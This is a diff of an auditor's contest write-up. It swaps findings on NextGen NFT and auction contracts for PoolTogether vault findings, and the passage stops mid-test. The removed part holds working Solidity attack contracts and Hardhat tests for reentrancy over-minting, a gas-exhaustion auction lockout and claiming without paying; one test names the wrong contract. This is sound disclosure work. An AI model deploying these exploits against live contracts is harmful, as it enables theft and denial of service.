@@ -1,860 +1,579 @@
-# NextGen
-OoolTogether contest || Vaults, ERC4626	 || 4 March 2024 to 11 March 2024 on [code4rena](https://code4rena.com/audits/2024-03-pooltogether#top)
+# PoolTogether
+PoolTogether contest || Vaults, ERC4626	 || 4 March 2024 to 11 March 2024 on [code4rena](https://code4rena.com/audits/2024-03-pooltogether#top)
 
 ## My Findings Summary
 
 |ID|Title|Severity|
 |--|-----|:------:|
-|[H&#8209;01](#h-01-reentrancy-in-nextgencoremint-can-allow-users-to-mint-tokens-more-than-the-max-allowance)|Reentrancy in `NextGenCore::mint` can allow users to mint tokens more than the max allowance|HIGH|
-|[H-02](#h-02-auctiondemoclaimauction-is-subjected-to-an-out-of-gas-when-executing-because-of-63-64-rule)|C4 NextGen finding: `AuctionDemo::claimAuction` is subjected to an `out of gas` when executing because of `63/64` rule|HIGH|
-|[H-03](#h-03-invalid-time-validation-can-lead-make-auction-winners-claiming-the-auction-without-paying)|Invalid time validation can lead make auction winners claiming the auction without paying|HIGH|
+|[H-01](#h-01-prizevaultclaimyieldfeeshares-subtracts-all-fees-whatever-the-value-passed-to-it)|`PrizeVault::claimYieldFeeShares()` subtracts all fees whatever the value passed to it|HIGH|
 ||||
-|[M&#8209;01](#m-01-minting-before-burning-in-nextgencoreburntomint-leads-to-reentrancy-issues)|Minting Before burning in `NextGenCore::burnToMint` leads to reentrancy issues|MEDIUM
+|[M-01](#m-01-the-winner-can-steal-claimer-receipent-and-force-him-to-pay-for-the-gas)|The winner can steal claimer receipent, and force him to pay for the gas|MEDIUM|
+|[M-02](#m-02-unchecking-for-the-actual-assets-withdrawn-from-the-vault-can-prevent-users-from-withdrawing)|Unchecking for the actual assets withdrawn from the vault can prevent users from withdrawing|MEDIUM|
+||||
+|[L-01](#l-01-claiming-yields-fees-can-be-done-in-recovery-mode-breaks-protocol-invariants)|Claiming Yields Fees can be done in `recovery mode` breaks protocol invariants|LOW|
+|[L-02](#l-02-checking-previous-approval-before-permit-is-done-with-strict-equality)|Checking previous approval before `permit()` is done with strict equality|LOW|
+|[L-03](#l-03-no-checking-for-breefy-vault-strategies-state-paused-or-not)|No checking for Breefy Vault strategies state (paused or not)|LOW|
+||||
+|[NC-01](#nc-01-assets-must-precede-the-shares-according-to-the-erc4626-standard)|Assets must precede the shares according to the ERC4626 standard|INFO|
 
 ---
 
-## [H-01] Reentrancy in `NextGenCore::mint` can allow users to mint tokens more than the max allowance
-### Lines of code
+## [H-01] `PrizeVault::claimYieldFeeShares()` subtracts all fees whatever the value passed to it.
 
-https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L193-L198
-https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L182-L183
+### Impact
 
-### Vulnerability details
+Fees are increased when the liquidator claims them and contributes to the prize, and the `yieldFeeReceipent` can claim them anytime he wants to.
 
-#### Impact
-In `NextGenCore`, users can mint tokens either in the airdrop period or the public sale period. But They are restricted by `maxCollectionPurchases` which restrict the number of tokens available for minting, to not exceed this limit.
+The fees are claimed by letting `yieldFeeReceipent` mint them.
 
-This check can be bypassed, where the `NextGenCore` increases the tokens minted for the user after minting the token by safe minting functionality. So the minter, which can be a smart contract implementing `onERC721Received` function, can call `NextGenCore::mint` again, and the check of the maximum allowance will be passed.
+The function subtracts all fees from `yieldFeeBalance` (i.e. resetting it to zero), but mints to the `yieldFeeReceipent` the number of shares passed as a parameter only.
 
+[src/PrizeVault.sol#L611-L622](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L611-L622)
 ```solidity
-// NextGenCore::mint
-// @audit [Reentrancy can make people mint more than the max allowed]
-_mintProcessing(mintIndex, _mintTo, _tokenData, _collectionID, _saltfun_o);
-if (phase == 1) {
-tokensMintedAllowlistAddress[_collectionID][_mintingAddress] =
-    tokensMintedAllowlistAddress[_collectionID][_mintingAddress] +
-    1;
-} else {
-tokensMintedPerAddress[_collectionID][_mintingAddress] =
-    tokensMintedPerAddress[_collectionID][_mintingAddress] +
-    1;
-}
-```
+    function claimYieldFeeShares(uint256 _shares) external onlyYieldFeeRecipient {
+        if (_shares == 0) revert MintZeroShares();
 
-```solidity
-// MinterContract::mint
-require(
-gencore.retrieveTokensMintedPublicPerAddress(col, msg.sender) + _numberOfTokens <=
-    gencore.viewMaxAllowance(col),
-"Max"
-);
-```
+        uint256 _yieldFeeBalance = yieldFeeBalance; // @audit getting all yeilds
+        if (_shares > _yieldFeeBalance) revert SharesExceedsYieldFeeBalance(_shares, _yieldFeeBalance);
 
+        yieldFeeBalance -= _yieldFeeBalance; // @audit subtracting all yeilds
 
-This problem is existed also in `NextGenCore::airDropTokens`. But since this function is only called by `MinterContract::airDropTokens` which is an admin-restricted call, It is kind of safe.
-```solidity
-// NextGenCore::airDropTokens
-_mintProcessing(mintIndex, _recipient, _tokenData, _collectionID, _saltfun_o);
-tokensAirdropPerAddress[_collectionID][_recipient] = tokensAirdropPerAddress[_collectionID][_recipient] + 1;
-```
+        _mint(msg.sender, _shares); // @audit minting only the _shares value passed by the `yieldFeeRecipent`
 
-#### Proof of Concept
-I wrote a smart contract that can make this attack, here is the solidity code for the contract, The file is `attack/ReentrancyMint.sol` in `hardhat/smart-contracts`.
-
-<details>
-  <summary>Contract</summary>
-  
-  ```solidity
-// SPDX-License-Identifier: MIT
-pragma solidity 0.8.19;
-
-import {NextGenCore} from "../NextGenCore.sol";
-import {MinterContract} from "../MinterContract.sol";
-
-contract ReentrancyMint {
-NextGenCore public immutable nextGenCore; // NextGen contract
-MinterContract public immutable minter; // Minter contract
-
-uint256 public collectionID; // The collection that is available for minting
-uint256 public numberOfTokens; // Number of tokens to mint each iteration
-uint256 public maxAllowance; // This parameter is only needed in allowlist sale
-string public tokenData = '{"tdh": "100"}'; // Token data
-address public mintTo; // The minter address (this is used only in airdrop sales)
-bytes32[] public merkleProof = [bytes32(0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870)]; // merkle Tree
-address public delegator = address(0); // Not needed
-
-uint256 iterator; // Number of reentrant calls
-
-// Deploy our contract, and set the minter and NextGenCore contracts addresses
-constructor(address _nextGenCore, address _minter) {
-    nextGenCore = NextGenCore(_nextGenCore);
-    minter = MinterContract(_minter);
-}
-
-/// @notice Setting the information about the collection, and the number of tokens to be minted
-/// @dev This function will be called before making the reentrancy attack
-/// @dev I made this function to store the data passed to the `MinterContract::mint`, to use it again in `onERC721Received`
-function setMintingFunctionData(uint256 _collectionID, uint256 _numberOfTokens, uint256 _maxAllowance) public {
-    collectionID = _collectionID;
-    numberOfTokens = _numberOfTokens;
-    maxAllowance = _maxAllowance;
-    mintTo = address(this);
-}
-
-/// @notice Call `MinterContract::mint` function
-function mintToken() public {
-    if (collectionID == 0) revert("Data is not set");
-    minter.mint(collectionID, numberOfTokens, maxAllowance, tokenData, mintTo, merkleProof, delegator, 2);
-}
-
-/**
- * - call `MinterContract::mint` ->
- * - `NextGenCore::mint` ->
- * - `NextGenCore::_mintProcessing` ->
- * - `NextGenCore(ERC721)::_safeMint` ->
- * - `NextGenCore(ERC721)::_checkOnERC721Received` ->
- * - This function will get called at this point
- * - And our function will call `MinterContract::mint` again
- * - 4 iteration will be made
- *
- * */
-function onERC721Received(address from, address to, uint256 tokenId, bytes memory data) external returns (bytes4) {
-    // To mint 5 tokens only
-    if (++iterator == 5) {
-        return this.onERC721Received.selector;
+        emit ClaimYieldFeeShares(msg.sender, _shares);
     }
-    // This contract will call `MinterContract::mint` again, and it will break the maxAllowance check
-    if (collectionID > 0) {
-        minter.mint(collectionID, numberOfTokens, maxAllowance, tokenData, mintTo, merkleProof, delegator, 2);
+```
+
+So the `yieldFeeRecipient` will lose its fees if he decides to claim a part from his yields.
+
+
+### Further problems that will occur
+
+This will make the `prizeVault` earning yield calculations goes incorrect.
+
+Since `totalDept` is determined by adding `totalSupply` to the `yieldFeeBalance`.
+
+[PrizeVault.sol#L790-L792C6](https://github.com/code-423n4/2024-03-pooltogether/blob/main/pt-v5-vault/src/PrizeVault.sol#L790-L792C6)
+```solidity
+    function _totalDebt(uint256 _totalSupply) internal view returns (uint256) {
+        return _totalSupply + yieldFeeBalance;
     }
-    return this.onERC721Received.selector;
-}
-}
 ```
 
+So `totalDept` will get decreased by a value greater than the value that `totalAssets` will increase (if the `yieldFeeRecipent` claimed part of his prize).
 
-</details>
+which will make `prizeVault` think it earns yields from `yieldVault` but it is from the fee recipient's remaining amount in reality. And this amount can be then claimed by the `LiquidationPair`.
 
+The function is restricted to the `yieldFeeRecipent`, and decreasing `totalDept` by a value more than `totalAssets` will not cause any critical issues (DoS or others), it will just make `prizeVault` earn yields not from `yieldVault` (similar to donations state), so no further impacts will occur.
 
-Then, I implemented a hardhat test to simulate the problem, you can copy/paste this test after `context("Get Price", ...)` block, in `nextGen.test.js` file.
 
-<details>
-  <summary>Testing js Script</summary>
+### Prood of Concept
 
-```javascript
-  context("Test `MinterContract::mint`", () => {
-it("should allow re-entrancy in `NextGenCore::mint`", async () => {
-    const [, , , , , , , , , , , , , hacker] = await ethers.getSigners();
+Let's take a scenario to illustrate the point:
 
-    // Deploy ReentranctContract, that will make the attack
-    const ReentrancyContract = await ethers.getContractFactory("ReentrancyMint");
-    const reentrancyContract = await ReentrancyContract.connect(hacker).deploy(
-        await contracts.hhCore.getAddress(),
-        await contracts.hhMinter.getAddress()
-    );
+- The vault is receiving yields.
+- Liquidators are claiming these yields and participate in the prize pool.
+- `yieldFeeBalance` is increasing.
+- `yieldFeeBalance` reaches 1000.
+- The `yieldFeeRecipent` decided to claim 500.
+- `yieldFeeRecipent` fires `claimYieldFeeShares()`, and passed 500 shares.
+- `yieldFeeRecipent` mints 500 successfully.
+- All `yieldFeeBalance` dropped to zero instead of being 500 (1000 - 500).
 
-    // Collection 1 , which is declared previously by devs in the test file, have a maxAllowance for a user to 2 tokens.
-    const collectionMaxAllowance = await contracts.hhCore.viewMaxAllowance(1);
-
-    console.log(`Collection 1 has max Allowance: ${collectionMaxAllowance}`); // 2
-
-    // We will set the data to make `reentrancyContract` mint 1 token each iteration
-    await reentrancyContract.connect(hacker).setMintingFunctionData(1, 1, 0);
-
-    /**
-     * - collectionId = 1 is avaialble for minting
-     * - The reentrancy contract will mint 5 tokens now by reentering `mint` before adding that the token was minted
-     *
-     * - The Attacker will simply make `ReentrancyMint` contract call `MinterContract::mint`
-     * - After making checks, the `NextGenCore` will mint an NFT to it
-     * - _safeMint() is used to mint, so the ERC721 will call `onERC721Received`, since its a contract
-     * - Our contract will call `MinterContract::mint` again
-     * - We didn't added tokens minted to the address, so the `ReentrancyMint` still has 0 tokens minted
-     * - This loops will do 4 successive iterations
-     * - After minting 4 times by `onERC721Received` + 1 time the beginning call then we called mint 5 times
-     * - Each time we minted 1 tokens, so the `ReentrancyMint` minted 5 tokens
-     * - The code will complete the stored uncompleted functions in the stack (like recursion), and add tokens minted
-     * - The mintedTokens of the user will be set to 5, but its useless now, as the hacker minted 5 tokens and passed the check
-     * - The minter passed The check successfully, well done
-     */
-    await reentrancyContract.connect(hacker).mintToken();
-
-    const reentrancyContractMintedTokens = await contracts.hhCore.retrieveTokensMintedPublicPerAddress(
-        1,
-        await reentrancyContract.getAddress()
-    );
-
-    console.log(`The reenterancyContract has ${reentrancyContractMintedTokens} tokens minted`); // 5 Tokens
-});
-});
-```
-</details>
-
-
-#### Tools Used
-Manual Review + Hardhat
-
-#### Recommended Mitigation Steps
-You must make the changes in the contract before doing the minting process, The minting proccess should be the last step, all changes should be made before interaction, following the [CEI pattern](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html).
-
-```diff
-// NextGenCore::mint
-- _mintProcessing(mintIndex, _mintTo, _tokenData, _collectionID, _saltfun_o);
-if (phase == 1) {
-tokensMintedAllowlistAddress[_collectionID][_mintingAddress] =
-    tokensMintedAllowlistAddress[_collectionID][_mintingAddress] +
-    1;
-} else {
-tokensMintedPerAddress[_collectionID][_mintingAddress] =
-    tokensMintedPerAddress[_collectionID][_mintingAddress] +
-    1;
-}
-+ _mintProcessing(mintIndex, _mintTo, _tokenData, _collectionID, _saltfun_o);
-```
-
-It is better to change it in the airdrop too.
-
-```diff
-// NextGenCore::airDropTokens
-- _mintProcessing(mintIndex, _recipient, _tokenData, _collectionID, _saltfun_o);
-tokensAirdropPerAddress[_collectionID][_recipient] = tokensAirdropPerAddress[_collectionID][_recipient] + 1;
-+ _mintProcessing(mintIndex, _recipient, _tokenData, _collectionID, _saltfun_o);
-```
-
-### Assessed type
-
-Reentrancy
-
---- 
-
-## [H-02] `AuctionDemo::claimAuction` is subjected to an `out of gas` when executing because of `63-64` rule
-
-### Lines of code
-
-https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L116
-
-### Vulnerability details
-
-#### Impact
-In `AuctionDemo::claimAuction`, the function can be permanently disabled, and it is subjected to revert with an `out of gas` reason, even if you submitted it with the max gas available in block size which is 30 million.
-
-The function returns bids to the bidders, and the winner gets the NFT. So if one of the bidders consumes all the gas supplied to it, which will be `{initial gas * (63/64)^depth(=1)}`, there will be little gas left. This will affect transferring funds to the next bidders and the NFT to the winner, which makes it vulnerable to to `out of gas` revert.
-
-If the bidder is a contract that consumes a lot of gas on receiving the ETH, as the snipped code below, It can disable claiming auction permanently.
-```solidity
-// The receiver will consume all gas provided to it {gas * (63/64)^depth(=1)}
-receive() external payable {
-  uint256 i;
-  while (i < 1e9) {
-      i++;
-  }
-}
-```
-We will discuss an example of when this bidder (gasWaster) participated in the auction two times (this is allowed in the Auction participating structure).
-- Auction starts
-- Bidders bid
-- The gasWaster bid in two different places.
-- Other bidders bid.
-- Auction ends and one bidder wins.
-- The Winner Called `AuctionDemo::claimAuction` function with `30M` as gas for the tx (the maximum available amount)
-- The function will go in for loop, sending eth to the bidders.
-- First, it will send ETH to the gasWaster address (which has a receive function that wastes all gas as that in the snipped code).
-- After some calls, it will send ETH to the gasWaster again (he participated two times).
-- The gasWaster addresses consumed all the gas, and no remaining gas for the other calls nor for transferring the NFT to the winner.
-- The function will revert with `out of gas` when submitting max available gas, making the function disabled permanently.
-
-**Here is the amount of gas that will left after sending ETH to the gasWaster in the first and second time.**
-
-- The values in the table are when the gasWaster is the first and second bidder.
-- Gas values are not 100% accurate, but it's not a problem, since They are for illustration only.
-
-Bidder|Avaialbe Gas|Calculate the sent gas|Gas Used|Remaning Gas|
-------|------------|----------------------|--------|------------|
-1|30,000,000|30,000,000 * (63/64)^1|29,531,250|468,750|
-2|468,750|468,750 * (63/64)^1|461,426|7,324|
-
-7,324 gas left from 30M! This will not make any other external call occur, the function reverts with an `out of gas` error.
-
-We are calling the function with the maximum amount of gas available, so we can't increase the gas above this value.
-
-The function is totally locked, no one can call it, it is subjected to a DoS attack on the blockchain (EVM) level not just the smart contract level.
-
-The problems that will occur:
-- The winner can't claim his reward and pays too much gas for nothing.
-- Bidders' ETH is locked permanently in the contract, and no way to get it back.
-
-As we saw the gas used by the gasWaster is ~`29,531,250`, leaving ~`461,426` in the first call.
-
-I tested when the function will revert with `out of gas` in case the gasWaster participated only one time, it gives me that it will revert after ~28 calls after the gasWaster call, this number is the maximum it can't afford, it can revert before this depending on the gasWaster call position.
-
-_**NOTE**: This problem is not the same as the unchecked call problem submitted by the bot. The `out of gas`, will not get solved by checking on the resulting value. If we add the check on success (as the bot report said), we will revert because of the `out of gas` from the external contract. So the function will revert with the reason `external call failed` when adding the bot suggestion. And if the function is left unchecked, which is good in this function especially, the function can revert with `out of gas`. No way to escape from this situation._
-
-
-**Why does a person pay ETH to just spoil the auction**
-
-The problem in the contract is that it's not a normal `out of gas` and locked ETH, as there are a lot of things that can encourage hackers to make this attack, as they will gain profit from it.
-
-The hacker can lock a valuable NFT auction, and ask the winner for money to allow the function (`claimAuction`) to fire, here is an example:
-```solidity
-receive() external payable {
-uint256 i;
-if (lockAuction /* gasWaster control this variable in the contract */) {
-  while (i < 1e9) {
-      i++;
-  }
-}
-}
-```
-
-Artists will have to pay to rescue the auction and people's funds by paying money to the hacker, as some NFTs worth millions.
-
-**The problems that will affect the protocol and business**
-- Users will lose their money, making them leave the protocol.
-- Less trust in the protocol.
-- NFT prices may drop, as the adoption will decrease.
-
-_**NOTE**:`1/64` and gas problems lie at a medium level in most cases, but the problem is that in this contract, it will cause a lot of losses, and break the Protocol's main functionality, which is auctioning valuable NFTs. So I made it a HIGH bug since the protocol service will crash because of it._
-
-#### Proof Of Concept
-
-I wrote a smart contract that can make this attack, here is the solidity code for the contract, The file is `attack/GasWastageAuctioneer.sol` in `hardhat/smart-contracts`.
-
-<details>
-  <summary>Contract</summary>
-  
-  
-```solidity
-// SPDX-License-Identifier: MIT
-pragma solidity 0.8.19;
-
-import {AuctionDemo} from "../AuctionDemo.sol";
-
-contract GasWastageAuctioneer {
-  AuctionDemo public immutable auctionContract; // NextGen contract
-
-  // Deploy our contract, and set the minter and NextGenCore contracts addresses
-  constructor(address _auctionContract) {
-      auctionContract = AuctionDemo(_auctionContract);
-  }
-
-  // Wasting gas with receiving ETH
-  receive() external payable {
-      uint256 i;
-      // The hacker can make a condition which gives him the possibility
-      // to bargain for the cancellation of gas wastage in exchange for money
-      while (i < 1e9) {
-          i++;
-      }
-  }
-
-  // gasWaster participate to auction
-  function participateInAuction(uint256 _tokenId) external payable {
-      auctionContract.participateToAuction{value: msg.value}(_tokenId);
-  }
-}
-```
-
-</details>
-
-Then, I implemented a hardhat test to simulate the problem, you can copy/paste this test after `context("Get Price", ...)` block, in `nextGen.test.js` file.
-
-<details>
-  <summary>Testing js script</summary>
-  
-  ```javascript
-context("Test `AuctionDemo::claimAuction`", () => {
-  it("It should block the `AuctionDemo::claimAuction` permenantly through `out of gas` error", async () => {
-      const [, , , , , , , , , , , , , receipent, bidder1, bidder2, gasWaster] = await ethers.getSigners();
-
-      const ONE_DAY = 24 * 60 * 60;
-      const ONE_TENTH_ETHER = 100000000000000000n;
-
-      // Deploy Auction contract
-      const auction = await ethers.getContractFactory("AuctionDemo");
-      const hhAuction = await auction.deploy(
-          await contracts.hhMinter.getAddress(),
-          await contracts.hhCore.getAddress(),
-          await contracts.hhAdmin.getAddress()
-      );
-
-      // Deploy GasWastageBidder, that will make the attack
-      const GasWastageBidder = await ethers.getContractFactory("GasWastageBidder");
-      const gasWastageBidder = await GasWastageBidder.connect(gasWaster).deploy(await hhAuction.getAddress());
-
-      // Get the current block.timestamp
-      const blockNumber = await ethers.provider.getBlockNumber();
-      const block = await ethers.provider.getBlock(blockNumber);
-      const currentTimestamp = block.timestamp;
-
-      // This token will be the third token, where two have been minted in the previous `context`
-      await contracts.hhMinter.mintAndAuction(
-          receipent.address, // receipent address
-          '{"tdh": "100"}', // _tokenData
-          2, //_varg0
-          3, // _collectionID
-          currentTimestamp + ONE_DAY * 7 // 7 days (The auction period)
-      );
-
-      // The tokenId of the NFT auctioned
-      const auctionTokenId =
-          (await contracts.hhCore.viewTokensIndexMin(3)) + (await contracts.hhCore.viewCirSupply(3)) - BigInt(1);
-
-      // The gasWaster participated in the auction First in 1st and 2nd positions in the auction, and placed .1 ether
-      await gasWastageBidder.connect(gasWaster).participateInAuction(auctionTokenId, { value: ONE_TENTH_ETHER });
-
-      // Comment/remove this code (the second gasWaster participation) to prevent `out of gas revert` and see the gas usage
-      await gasWastageBidder
-          .connect(gasWaster)
-          .participateInAuction(auctionTokenId, { value: ONE_TENTH_ETHER + BigInt(1) });
-
-      // Another peaple participater in the auction (+another 10 Bids)
-      for (let i = 1; i <= 4; i++) {
-          const bidder1Value = BigInt(i * 2); // 2, 4, 6, 8, 10
-          const bidder2Value = BigInt(i * 2) + BigInt(1); // 3, 5, 7, 9, 11
-          await hhAuction
-              .connect(bidder1)
-              .participateToAuction(auctionTokenId, { value: ONE_TENTH_ETHER * bidder1Value });
-          await hhAuction
-              .connect(bidder2)
-              .participateToAuction(auctionTokenId, { value: ONE_TENTH_ETHER * bidder2Value });
-      }
-
-      // Auciton ended, and bidder2 is the winner
-      await network.provider.send("evm_increaseTime", [ONE_DAY * 8]);
-      await network.provider.send("evm_mine", []);
-
-      // The receipent is a trust EOA owner by NextGenTeam, and they will make the AuctionDemo has approval
-      // for the token, in order to transfer it to the winner
-      const hhAuctionAddress = await hhAuction.getAddress();
-      await contracts.hhCore.connect(receipent).approve(hhAuctionAddress, auctionTokenId);
-
-      // bidder2 wants to claim the auction, gasLimit is 30 million (maximimum amount of gas)
-      const tx = await hhAuction.connect(bidder2).claimAuction(auctionTokenId, { gasLimit: 30_000_000 });
-      const txReceipt = await tx.wait();
-
-      // This part will be reached only if the gasWaster participated only one time
-      const gasUsedInETH = txReceipt.gasUsed * txReceipt.gasPrice;
-      console.log(
-          `Gas used by the winner to claim his prize: ${txReceipt.gasUsed} gas = ${ethers.formatEther(
-              gasUsedInETH.toString()
-          )} ETH`
-      );
-  });
-});
-```
-
-
-</details>
-
-This js test script will give the following error `Transaction ran out of gas`, disabling the claiming auction permanently.
-
-_Keep in mind that the javascript script will make two while loops each making 1 billion iterations. The transaction will revert (internally from the blockchain, not the js script itself) before completing these iterations. If your PC has an old processor, you can terminate the process if you find the PC goes hotter._
-
-#### Tools Used
-Manual Review + Hardhat
-
-#### Recommended Mitigation Steps
-
-There are two solutions to this problem:
-- Disallowing contracts from participating in the auction.
-- Restrict the gas passed to the bidders (external calls).
-
-### Disallowing contracts from participating in the auction
-
-Simple, we can check for the caller of the `AuctionDemo::participateToAuction` function, and revert if it is a contract.
-```diff
-// AuctionDemo
-function participateToAuction(uint256 _tokenid) public payable {
-+   address sender = msg.sender;
-+   uint256 codeSize;
-+   assembly {
-+       codeSize := extcodesize(sender)
-+   }
-+   require(codeSize == 0, "Contracts are not allowed");
-  require(
-      msg.value > returnHighestBid(_tokenid) &&
-          block.timestamp <= minter.getAuctionEndTime(_tokenid) &&
-          minter.getAuctionStatus(_tokenid) == true
-  );
-  auctionInfoStru memory newBid = auctionInfoStru(msg.sender, msg.value, true);
-  auctionInfoData[_tokenid].push(newBid);
-}
-```
-**NOTE**: this check is not enough to check if the caller is a contract or not, as `extcodesize(sender)` returns 0 in the following cases:
-- an externally-owned account.
-- a contract in construction.
-- an address where a contract will be created.
-- an address where a contract lived, but was destroyed.
-
-So it is not the best check, and the problem still can happen if the contract was in the construction for example.
-
-### Restrict the gas passed to the bidders (external calls)
-
-Although restricting gas passed is not the best practice, it will solve the problem we are facing.
-
-Instead of forwarding all the gas (`63/64`) to the external call, we will restrict it by a given value, since it's just sending ETH to an address, the gas cost will be relatively constant ~`21000`. So we can pass 50k to be sure that the normal transfer will be made successfully.
-
-```diff
-// AuctionDemo::claimAuction -> else if block
-
-// Make the gas equals 50_000 if gasLeft is greater than 50_000
-+ uint256 gasForwarded = gasleft() < 50_000 ? gasleft() : 50_000;
-
-(bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{
-  value: auctionInfoData[_tokenid][i].bid,
-+   gas: gasForwarded
-}("");
-emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
-```
-
-Now, if the receiver (gasWaster) consumed all the gas, he would not take the money, not affecting other bidders.
-
-Auction biddings will be passed successfully, and the gasWaster is the person who will get punished.
-
-_There is no way to recover failed transactions, and `AuctionDemo` has no function to withdraw ETH in case of a problem, but this is not the problem we are discussing._
-
-### One last thing
-
-_As we said before, listening to bots' suggestions and checking this function `AuctionDemo::claimAuction` will make the auction vulnerable to a DoS attack, so the devs should keep this in mind. Here's the scenario_
-```solidity
-receive() external payable {
-  revert("Break auction");
-}
-```
-
-
-### Assessed type
-
-DoS
-
----
-
-## [H-03] Invalid time validation can lead make auction winners claiming the auction without paying.
-
-### Lines of code
-
-https://github.com/code-423n4/2023-10-nextgen/blob/main/hardhat/smart-contracts/AuctionDemo.sol#L105
-https://github.com/code-423n4/2023-10-nextgen/blob/main/hardhat/smart-contracts/AuctionDemo.sol#L125
-
-
-### Vulnerability details
-
-#### Impact
-
-In `AuctionDemo::claimAuction` contract, the timing check checks that the timestamp equals or greater than the auction ending time.
-```solidity
-// @audit [M: The winner can fire `claimAuction` and `cancelBid` at the exact time of ending
-//        causing The winner to claim the NFT without paying, the the bidder to withdraw two times]
-require(
-block.timestamp >= minter.getAuctionEndTime(_tokenid) &&
-    auctionClaim[_tokenid] == false &&
-    minter.getAuctionStatus(_tokenid) == true
-);
-```
-
-And in `AuctionDemo::cancelBid` or `AuctionDemo::cancelAllBids`, the timing check checks that the timestamp is smaller than or equal to the auction ending time.
-```solidity
-require(block.timestamp <= minter.getAuctionEndTime(_tokenid), "Auction ended");
-```
-
-So if the winner fired the `claimAuction()` and the `cancelBid()` function at the timestamp of the ending of the auction. He can claim the auction (get the NFT), and cancel his bid too.
-
-- If the auction ending time is `1700324322`.
-- The winner fired the `claimAuction()` then `cancelBid()` at the timestamp `1700324322`.
-- The winner claimed the NFT and refunded his bid too.
-
-The likelihood of this problem occurring is very low, as it should occur at the exact timestamp of the ending of the auction.
-
-If the winner made this (fired the two functions through a contract) at a random time, and luckily the block miner set the timestamp at the exact auction ending time of the auction, The attack will take place.
-
-The block time is ~11-13 sec, so it may occur who nows.
-
-Miners can do this attack too, but as we said it is scarcely to happen.
-
-#### Proof of Concept
-I wrote a smart contract that can make this attack, here is the solidity code for the contract, The file is `attack/ClaimWithoutPay.sol` in `hardhat/smart-contracts`.
-
-<details>
-  <summary>Contract</summary>
-  
-  ```solidity
-// SPDX-License-Identifier: MIT
-pragma solidity 0.8.19;
-
-import {AuctionDemo} from "../AuctionDemo.sol";
-
-contract ClaimWithoutPay {
-AuctionDemo public immutable auctionDemo; // Auction contract
-
-// Deploy our contract, and set Auction address
-constructor(address _auctionDemo) payable {
-    auctionDemo = AuctionDemo(_auctionDemo);
-}
-
-// To receive ether
-receive() external payable {}
-
-// participating in auction
-function participateToAuction(uint256 _tokenId) public payable {
-    auctionDemo.participateToAuction{value: msg.value}(_tokenId);
-}
-
-// Claim the auction, and cancel our bid
-function claimWithoutPay(uint256 _token, uint256 _index) public {
-    auctionDemo.claimAuction(_token);
-    auctionDemo.cancelBid(_token, _index);
-}
-
-// To accept the NFT, when receiving it
-function onERC721Received(address from, address to, uint256 tokenId, bytes memory data) external returns (bytes4) {
-    return this.onERC721Received.selector;
-}
-}
-```
-
-
-</details>
-
-
-I implemented a hardhat test to simulate the problem, you can copy/paste this test after `context("Get Price", ...)` block, in `nextGen.test.js` file.
-
-<details>
-  <summary>Testing js script</summary>
-  
-  ```javascript
-context("Test `AuctionDemo`", () => {
-it("should allow The winner to claim his prize, and ", async () => {
-    const [, , , , , , , , , , , , , receipent, bidder1, bidder2, winner] = await ethers.getSigners();
-    // Deploy Auction Contract
-    const auction = await ethers.getContractFactory("AuctionDemo");
-    const hhAuction = await auction.deploy(
-        await contracts.hhMinter.getAddress(),
-        await contracts.hhCore.getAddress(),
-        await contracts.hhAdmin.getAddress()
-    );
-
-    const ONE_DAY = 24 * 60 * 60;
-    const ONE_ETHER = 1000000000000000000n;
-
-    // Deploy `ClaimWithoutPay` which will be the winner, and claim the auction without bidding
-    const ClaimWithoutPay = await ethers.getContractFactory("ClaimWithoutPay");
-    const claimWithoutPayContract = await ClaimWithoutPay.deploy(await hhAuction.getAddress(), {});
-
-    // Get the current block.timestamp
-    const blockNumber = await ethers.provider.getBlockNumber();
-    const block = await ethers.provider.getBlock(blockNumber);
-    const currentTimestamp = block.timestamp;
-
-    // This token will be the third token, where two tokens have been minted in the previous `context`
-    await contracts.hhMinter.mintAndAuction(
-        receipent.address, // receipent address
-        '{"tdh": "100"}', // _tokenData
-        2, //_varg0
-        3, // _collectionID
-        currentTimestamp + ONE_DAY * 7 // 7 days
-    );
-
-    // The tokenId of the NFT auctioned
-    const auctionTokenId =
-        (await contracts.hhCore.viewTokensIndexMin(3)) + (await contracts.hhCore.viewCirSupply(3)) - BigInt(1);
-
-    // bidder1 participates in auction, and placed 1 ether
-    await hhAuction.connect(bidder1).participateToAuction(auctionTokenId, { value: ONE_ETHER });
-
-    // bidder2 participates in auction, and placed 2 ether
-    await hhAuction.connect(bidder2).participateToAuction(auctionTokenId, { value: ONE_ETHER * BigInt(2) });
-
-    // `claimWithoutPayContract` contract (The winner) participates in the auction, and placed 3 ether
-    await claimWithoutPayContract
-        .connect(winner)
-        .participateToAuction(auctionTokenId, { value: ONE_ETHER * BigInt(3) });
-
-    // The receipent is a trust EOA owner by NextGenTeam, and they will make the AuctionDemo has approval
-    // for the token, in order to transfer it to the winner
-    await contracts.hhCore.connect(receipent).approve(await hhAuction.getAddress(), auctionTokenId);
-
-    // Before doing the attack, the contract `AuctionDemo` should has money, after `claiming auction`
-    // This will occuar if there is more than one auction in the `AuctionDemo`
-    //
-    // This token will be the fourth token, where two tokens have been minted in the previous `context`
-    // The second auction, is used to make the contract `AuctionDemo` has balance from the two auctions
-    // And the steal can occuars
-    await contracts.hhMinter.mintAndAuction(
-        receipent.address, // receipent address
-        '{"tdh": "100"}', // _tokenData
-        2, //_varg0
-        3, // _collectionID
-        currentTimestamp + ONE_DAY * 14 // 14 days
-    );
-    // The second auctioned token exceeds the previous token by 1.
-    // We made this second auction, and made a bid with 3 ETH, so that there will be excessive 3 ETH
-    // in `AuctionDemo` when claiming the auction 1.
-    await hhAuction
-        .connect(bidder1)
-        .participateToAuction(auctionTokenId + BigInt(1), { value: ONE_ETHER * BigInt(3) });
-
-    // The balance of the `claimWithoutPayContract` before claiming
-    let claimWithoutPayContractBalance = await ethers.provider.getBalance(
-        await claimWithoutPayContract.getAddress()
-    );
-    console.log(`The balance of the 'ClaimWithoutPay' contract : ${claimWithoutPayContractBalance}`);
